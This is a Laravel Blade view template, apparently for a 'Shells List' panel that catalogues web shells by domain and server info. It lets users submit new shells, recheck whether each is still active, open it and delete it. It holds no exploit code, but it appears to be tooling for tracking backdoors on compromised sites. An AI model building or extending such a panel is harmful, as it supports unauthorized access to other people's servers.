@extends('include.app')
@section('title', 'Shells List')
@section('content')
    <div class="container py5">
        <h6 style="font-size: 10pt" class="mb-4">
            <a href="{{ route('home') }}" class="text-decoration-none">Home</a> > 
            Shells
        </h6>
        <div class="ht-tm-cat">
            <form>
                <div class="mb-3">
                    <input type="text" class="form-control col-md-6 mb-1" placeholder="{{ (isset($_GET['keyword']) !== false) ? $_GET['keyword'] : 'Domain, Shell Name, Server Info' }}" name="keyword">
                    <div class="input-group-append">
                        <button type="submit" class="btn btn-outline-primary btn-sm" type="button">Search</button>
                    </div>
                </div>
            </form>
            <h5 class="ht-tm-cat-title mb-3">
                Shells List <a href="{{ route('shell') }}/new" class="btn btn-outline-primary btn-sm mb-2 pull-right" title="Submit New Shell"><span class="fa fa fa-plus-square fa-fw"></span> Submit New</a>
            </h5>

            @if($message = Session::get('alert'))
            <div class="alert alert-primary alert-dismissible fade show" role="alert">
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">×</span>
                </button>
                {{ $message }}
            </div>
            @endif
            <div id="message"></div>
            <div class="ht-tm-codeblock" style="max-width: 100%; overflow: scroll;">
                <table class="table table-hover table-striped ht-tm-element border">
                    <thead class="thead-dark">
                        <tr>
                        <th width="30">#</th>
                        <th width="200">Date</th>
                        <th width="250">Domain</th>
                        <th width="500">Server Info</th>
                        <th width="50" class="text-center">Status</th>
                        <th class="text-center" width="250">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($data as $d)
                        @php
                        $skipped = ($data->currentPage() * $data->perPage()) - $data->perPage();
                        @endphp
                        <tr>
                            <th scope="row">{{ $loop->iteration + $skipped }}</th>
                            <td>{{ date('Y-m-d H:i', strtotime($d->created_at)) }}</td>
                            <td>
                                <a href="http://{{ $d->domain }}" target="_blank">
                                    {{ (strlen($d->domain) > 23) ? substr($d->domain, 0, 23)." ..." : $d->domain }} <span class="fa fa-external-link"></span>
                                </a>
                            </td>
                            <td>{{ substr($d->server_info, 0, 45) }} ...</td>
                            <td class="text-center">
                                <i class="{{ ($d->status == 'active') ? "fa fa-check-circle-o text-success" : "fa fa-close text-danger"  }}"></i>
                            </td>
                            <td class="text-center">
                                    <input type="hidden" name="id" id="id" value="{{ Crypt::encryptString($d->id) }}">
                                    <a href="{{ route('shell') }}/detail/{{ Crypt::encryptString($d->id) }}" class="btn btn-outline-primary btn-sm" title="Detail Shell"><span class="fa fa-eye fa-fw"></span></a>
                                    <button class="btn btn-outline-primary btn-sm" title="Recheck Shell"  onclick="return refresh_shell({{$d->id}})"><span class="fa fa-refresh fa-fw"></span></button>
                                    <a href="{{ $d->url }}" class="btn btn-outline-primary btn-sm" title="Go to Shell" target="_blank"><span class="fa fa-external-link fa-fw"></span></a>
                                    <form method="POST" action="{{ route('shell') }}/delete" class="float-right">
                                    @csrf
                                    <input type="hidden" name="id" value="{{ Crypt::encryptString($d->id) }}">
                                    <button class="btn btn-outline-primary btn-sm" title="Delete Shell" onclick="return confirm('Are you sure?')"><span class="fa fa-trash fa-fw"></span></button>
                                </form>
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
                {!! $data->links() !!}
            </div>
        </div>
    </div>
@endsection
@section('js')
<script>
    function refresh_shell(id){
        $.post("{{ route('shell_cekjq') }}", {
            id: id,
        },
        function(data, status) {
            if (data == 'Active') {
                $('#message').append('<div class="alert alert-primary alert-dismissible fade show" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button> <strong>Recheck Success!</strong> Shell Active! <br/><a class="font-weight-bold" onclick="location.reload();">Refresh</a> page to refresh status!</div>');
                $("html, body").animate({ scrollTop: 0 }, "slow");
            } else {
                $('#message').append('<div class="alert alert-primary alert-dismissible fade show" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button> <strong>Recheck Success!</strong> Shell Inactive! <br/><a  class="font-weight-bold" onclick="location.reload();">Refresh</a> page to refresh status!</div>');
                $("html, body").animate({ scrollTop: 0 }, "slow");
            }
        });
    }
</script>
@endsection
